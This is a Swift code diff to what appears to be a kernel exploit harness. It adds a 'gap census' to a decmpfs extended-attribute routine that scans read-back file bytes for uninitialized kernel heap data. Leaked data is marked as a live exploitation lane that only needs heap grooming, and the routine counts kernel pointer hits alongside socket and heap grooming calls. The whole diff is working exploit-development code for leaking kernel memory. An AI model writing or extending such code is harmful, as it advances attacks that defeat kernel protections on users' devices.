@@ -363,10 +363,44 @@ enum Runners {
                 i += 8
             }
         }
+        /* v3 THE GAP CENSUS (the 11-21 receipt's missing discriminator:
+           hits=0 x4 cannot distinguish the three cases —
+             all 0x41 beyond produced -> served PLAIN (the xattr ignored)
+             all zero               -> the gap ZERO-FILLS (dead on this train)
+             garbage                -> UNINITIALIZED KERNEL HEAP (ALIVE — the
+                                       groom placement is the only thing owed) */
+        var census = ""
+        let produced = min(chunks * producePerChunk, bytes.count)
+        if produced < bytes.count && bytes.count >= 8 {
+            var nA = 0, nZ = 0, nO = 0
+            var oSamples: [String] = []
+            var i = produced
+            while i + 8 <= bytes.count {
+                var v: UInt64 = 0
+                for k in 0..<8 { v |= UInt64(bytes[i + k]) << (8 * UInt64(k)) }
+                if v == 0x4141_4141_4141_4141 { nA += 1 }
+                else if v == 0 { nZ += 1 }
+                else {
+                    nO += 1
+                    if oSamples.count < 4 {
+                        oSamples.append(String(format: "0x%016llx @ +0x%x", v, i))
+                    }
+                }
+                i += 8
+            }
+            let verdict = nO > 0
+                ? " <<< UNINITIALIZED-CLASS — the lane is ALIVE (groom owed)"
+                : (nA > nZ ? " (served PLAIN — the xattr path not taken)"
+                           : " (gap zero-fills — dead on this train)")
+            census = String(format: " gap=%dB A=%d zero=%d other=%d%@",
+                            bytes.count - produced, nA, nZ, nO,
+                            oSamples.isEmpty ? "" : " SAMPLES: " + oSamples.joined(separator: ","))
+                    + verdict
+        }
         groomSocketsRelease()
         groomRelease()
         return DecmpfsResult(wroteXattr: true, readBack: back.count, kernelPointerHits: hits,
-                             samples: samples, note: tl("读取 ") + "\(back.count)" + tl(" 字节") + groomNote)
+                             samples: samples, note: tl("读取 ") + "\(back.count)" + tl(" 字节") + groomNote + census)
     }
 
     // ---- FontParser
